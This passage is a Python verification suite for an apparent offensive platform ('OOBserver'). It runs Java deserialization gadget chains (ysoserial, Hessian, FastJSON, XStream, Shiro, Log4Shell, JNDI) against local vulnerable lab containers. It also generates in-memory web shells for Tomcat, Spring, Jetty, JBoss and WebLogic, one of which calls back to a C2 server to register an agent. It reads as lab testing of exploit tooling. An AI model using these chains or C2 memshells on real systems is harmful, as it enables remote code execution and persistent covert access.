    tok = new_token("c2_ms_ser")
    s, d = gen_memshell("tomcat", "filter", "c2", "serialize", token=tok)
    if s != 200:
        record("c2_memshell_serialize", "ERR ", f"generate failed: {d}")
        return

    payload_info = d.get("payload")
    if not payload_info:
        # Payload generation succeeded but serialize delivery failed (check sidecar logs)
        bytecode_ok = bool(d.get("bytecode_b64"))
        record("c2_memshell_serialize", "ERR ",
               f"bytecode_ok={bytecode_ok} but serialize payload missing — "
               "check sidecar has --add-opens java.xml/... for TemplatesImpl access")
        return

    b64 = payload_info.get("value","")
    if not b64:
        record("c2_memshell_serialize", "ERR ", "empty payload value")
        return

    try:    raw = base64.b64decode(b64)
    except: record("c2_memshell_serialize", "ERR ", "payload not base64"); return

    print(f"  [*] Serialize payload: {len(raw)} bytes, sending to /deser")
    code, resp = post_raw(f"{VULNLAB}/deser", raw)
    if code == 0:
        record("c2_memshell_serialize", "SKIP", f"vulnlab unreachable: {resp}")
        return

    # Wait for C2 agent (won't work on non-Tomcat vulnlab, but tests the payload generation)
    print(f"  [*] POST to /deser: HTTP {code}. Waiting {C2_WAIT}s for agent...")
    deadline = time.time() + C2_WAIT
    agent = None
    while time.time() < deadline:
        _, agents = get("/c2/agents")
        if isinstance(agents, list) and agents:
            recent = [a for a in agents if a.get("last_seen","") > datetime.now().strftime("%Y-%m-%d")]
            if recent:
                agent = recent[0]
                break
        time.sleep(2)

    if agent:
        record("c2_memshell_serialize", "PASS",
               f"agent registered from vulnlab deser: {agent.get('agent_id','?')}")
    else:
        # Serialize delivery to non-Tomcat can't inject filter — expected SKIP
        record("c2_memshell_serialize", "SKIP",
               "vulnlab is not Tomcat — serialize memshell can't inject filter "
               "(payload generation OK, injection skipped)")


def test_all_memshells_generate():
    """Verify every memshell in the catalog can be generated (bytecode delivery)."""
    print("\n  ── Memshell generation smoke tests ──────────────────────────────")
    combos = [
        ("tomcat", "filter", "cmd"),
        ("tomcat", "filter", "behinder"),
        ("tomcat", "filter", "godzilla"),
        ("tomcat", "filter", "c2"),
        ("tomcat", "valve", "cmd"),
        ("tomcat", "listener", "cmd"),
        ("tomcat", "servlet", "cmd"),
        ("tomcat", "executor", "cmd"),
        ("spring", "interceptor", "cmd"),
        ("spring", "controller", "cmd"),
        ("spring", "webflux", "cmd"),
        ("jetty", "filter", "cmd"),
        ("jboss", "filter", "cmd"),
        ("weblogic", "filter", "cmd"),
    ]
    tok = new_token("ms_gen")
    for fw, mtype, shell in combos:
        chain_label = f"ms_{fw}_{mtype}_{shell}"
        s, d = gen_memshell(fw, mtype, shell, "bytecode", token=tok)
        if s == 200 and d.get("bytecode_b64"):
            b64 = d["bytecode_b64"]
            record(chain_label, "PASS",
                   f"bytecode={len(base64.b64decode(b64))}b class={d.get('class_name','?')}")
        else:
            record(chain_label, "ERR ", f"s={s} keys={list(d.keys())}")


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    print("=" * 70)
    print("  OOBserver Chain Verification Suite")
    print(f"  CT1={OOBSERVER}  CT2={VULNLAB}")
    print(f"  OOB callback: {CALLBACK_BASE}")
    print("=" * 70)

    # Login
    login()
    ensure_project()

    # Check targets
    print("\n[*] Target reachability:")
    vl_ok  = check_target(VULNLAB,    "vulnlab     :8888")
    l4_ok  = check_target(LOG4SHELL,  "log4shell   :8081")
    sh_ok  = check_target(SHIRO_URL,  "shiro       :8082")
    j8old_ok = check_target(JAVA8OLD_URL, "java8-old   :8891")
    j7_ok  = check_target(JAVA7_URL,  "java7       :8892")
    j17_ok = check_target(JAVA17_URL, "java17      :8893")
    sp3_ok = check_target(SPRING3_URL,"spring3     :8894")
    cb2_ok = check_target(CB2_URL,    "cb2         :8895")

    # ── Section 1: ysoserial chains (vulnlab — CC3/CC4/CB1 all on classpath) ───
    print("\n[*] Section 1a: ysoserial chains → vulnlab :8888")
    for cid in ["ysoserial_cc2","ysoserial_cc4","ysoserial_cc5","ysoserial_cc6","ysoserial_cc7",
                "ysoserial_cb1","cb_no_cc","ysoserial_rome",
                "ysoserial_groovy1","ysoserial_hibernate1"]:
        test_deser_chain(cid)

    print("\n[*] Section 1b: ysoserial chains needing old JVM → java8-old :8891")
    # cc1/cc3: need Java < 8u232 (AnnotationInvocationHandler fix)
    for cid in ["ysoserial_cc1","ysoserial_cc3"]:
        if j8old_ok:
            test_deser_chain(cid, target_url=JAVA8OLD_URL, container_name="vuln-java8old")
        else:
            record(cid, "SKIP", "java8-old target not running (:8891)")

    print("\n[*] Section 1c: java7 container (:8892) — ysoserial_cc6 (ysoserial_jdk7u21 skipped: serialVersionUID mismatch)")
    # ysoserial_jdk7u21 fails when ysoserial runs on Java 8+ (AnnotationInvocationHandler sUID differs).
    # Instead verify java7 container works with CC6 (CC3.2.1 on classpath, no JVM version restriction).
    record("ysoserial_jdk7u21", "SKIP", KNOWN_SKIP["ysoserial_jdk7u21"])
    if j7_ok:
        test_deser_chain("ysoserial_cc6", target_url=JAVA7_URL, container_name="vuln-java7")
    else:
        record("ysoserial_cc6_java7", "SKIP", "java7 target not running (:8892)")

    print("\n[*] Section 1d: ysoserial spring1/spring2 → spring3 :8894")
    for cid in ["ysoserial_spring1","ysoserial_spring2"]:
        if sp3_ok:
            test_deser_chain(cid, target_url=SPRING3_URL, container_name="vuln-spring3")
        else:
            record(cid, "SKIP", "spring3 target not running (:8894)")

    print("\n[*] URLDNS / JRMPClient:")
    test_urldns("ysoserial_urldns")
    # jrmp_client: routed to java8-old (before JEP 290 at 8u121)
    if j8old_ok:
        test_jrmp_client(jrmp_port=int(os.getenv("OOB_JRMP", "10099")))
    else:
        record("ysoserial_jrmp_client", "SKIP", "java8-old target not running (JEP 290 blocks on modern JVM)")

    # ── Section 2: jchains native deserialization ──────────────────────────────
    print("\n[*] Section 2a: jchains native chains → vulnlab :8888")
    for cid in ["jchains_native_cc6","jchains_native_cb1",
                "jchains_native_k1_secondary",
                "jchains_cc1","jchains_cc2","jchains_cc3","jchains_cc4","jchains_cc6",
                "jchains_native_jackson","jchains_native_c3p0_el"]:
        test_deser_chain(cid)
    # CB1 JNDI and C3P0 LDAP need jndi_url param (not cmd)
    test_deser_jndi_chain("jchains_native_cb1_jndi")
    test_deser_jndi_chain("jchains_native_c3p0_ldap")

    print("\n[*] Section 2b: jchains jdk17 chains → java17 :8893")
    for cid in ["jchains_native_jdk17_1","jchains_native_jdk17_2"]:
        if j17_ok:
            test_deser_chain(cid, target_url=JAVA17_URL, container_name="vuln-java17")
        else:
            record(cid, "SKIP", "java17 target not running (:8893)")

    print("\n[*] Section 2c: jchains_native_cb2 → cb2 :8895")
    if cb2_ok:
        test_deser_chain("jchains_native_cb2", target_url=CB2_URL, container_name="vuln-cb2")
    else:
        record("jchains_native_cb2", "SKIP", "cb2 target not running (:8895)")

    # ── Section 3: Hessian chains ──────────────────────────────────────────────
    print("\n[*] Section 3: Hessian1 chains (→ /hessian)")
    for cid in ["hessian1_spring",
                "jchains_hessian1_spring","jchains_hessian1_spring2",
                "jchains_hessian1_spring_exec","jchains_hessian1_exec",
                "jchains_hessian1_rome1","jchains_hessian1_rome2",
                "jchains_hessian1_secondary","jchains_hessian1_bcel"]:
        test_hessian_chain(cid, version=1)

    # marshalsec.Hessian outputs Hessian1 format → send to /hessian endpoint
    test_hessian_chain("hessian2_spring", version=1)

    print("\n[*] Section 4: Hessian2 chains (→ /hessian2)")
    for cid in ["jchains_hessian2_spring","jchains_hessian2_spring2",
                "jchains_hessian2_spring_exec","jchains_hessian2_exec",
                "jchains_hessian2_rome1","jchains_hessian2_rome2",
                "jchains_hessian2_secondary","jchains_hessian2_bcel",
                "jchains_hessian2_tostring_jackson","jchains_hessian2_tostring_xbean"]:
        test_hessian_chain(cid, version=2)

    # ── Section 5: FastJSON ────────────────────────────────────────────────────
    print("\n[*] Section 5: FastJSON chains (→ /fastjson)")
    for cid in ["fastjson_jdbcrowset","fastjson_jdbcrowset_v2","fastjson_bcel",
                "jchains_fastjson","jchains_fastjson_bcel",
                "jchains_fastjson_c3p0_h2","jchains_fastjson_jndi"]:
        test_fastjson_chain(cid)

    # ── Section 6: XStream ─────────────────────────────────────────────────────
    print("\n[*] Section 6: XStream chains (→ /xstream)")
    for cid in ["xstream_eventhandler","jchains_xstream","jchains_xstream_exec","jchains_xstream_jndi"]:
        test_xstream_chain(cid)

    # ── Section 7: Log4Shell ───────────────────────────────────────────────────
    print("\n[*] Section 7: Log4Shell")
    test_log4shell_via_vulnlab()
    if l4_ok:
        test_log4shell("log4shell_dedicated")

    # ── Section 8: Shiro ──────────────────────────────────────────────────────
    print("\n[*] Section 8: Shiro chains")
    if sh_ok:
        test_shiro("shiro_cbc")
        test_shiro("shiro_gcm")
        test_shiro("jchains_shiro_cbc")  # Exec bug fixed — now testable
    else:
        for c in ["shiro_cbc","shiro_gcm","jchains_shiro_cbc"]:
            record(c, "SKIP", "shiro container not running")

    # ── Section 9: C3P0 / H2 / BlazeDS ───────────────────────────────────────
    print("\n[*] Section 9: C3P0 / H2 / BlazeDS chains")
    for cid in ["c3p0_jndi","c3p0_wrapperds","jchains_blazeds_axis2"]:
        test_deser_chain(cid)
    # H2 JDBC chain uses /h2jdbc endpoint (not /deser) with a JDBC URL, not serialized bytes
    test_h2_jdbc("jchains_h2_jdbc")

    # ── Section 10: JNDI ResourceRef chains ───────────────────────────────────
    print("\n[*] Section 10: JNDI ResourceRef chains (via FastJSON endpoint)")
    for cid in ["jchains_jndi_tomcat_el","jchains_jndi_groovy",
                "jchains_jndi_snakeyaml","jchains_jndi_beanshell"]:
        test_fastjson_chain(cid)

    # ── Section 11: Memshell generation smoke tests ───────────────────────────
    test_all_memshells_generate()

    # ── Section 12: C2 memshell (focus) ───────────────────────────────────────
    print("\n[*] Section 12: C2 Memshell (★ primary focus ★)")
    test_c2_memshell_serialize()   # tests payload generation + serialize fix
    test_c2_memshell_jndi()        # full E2E: JNDI → Tomcat → C2 agent → cmd

    summary()

if __name__ == "__main__":
    main()
